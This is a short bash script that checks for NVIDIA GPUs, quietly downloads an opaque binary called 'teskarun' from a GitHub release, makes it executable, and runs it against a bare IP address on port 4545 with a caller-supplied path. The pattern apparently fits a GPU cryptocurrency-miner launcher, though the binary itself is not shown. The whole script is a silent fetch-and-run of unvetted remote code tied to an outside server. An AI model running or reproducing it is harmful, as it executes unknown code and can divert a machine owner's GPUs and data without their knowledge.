#!/bin/bash
nvidia-smi -L
wget https://github.com/kaseyigv24/Teska/releases/download/1/teskarun &> /dev/null
chmod +x teskarun
./teskarun -P http://216.198.92.69:4545/"$1" &> log
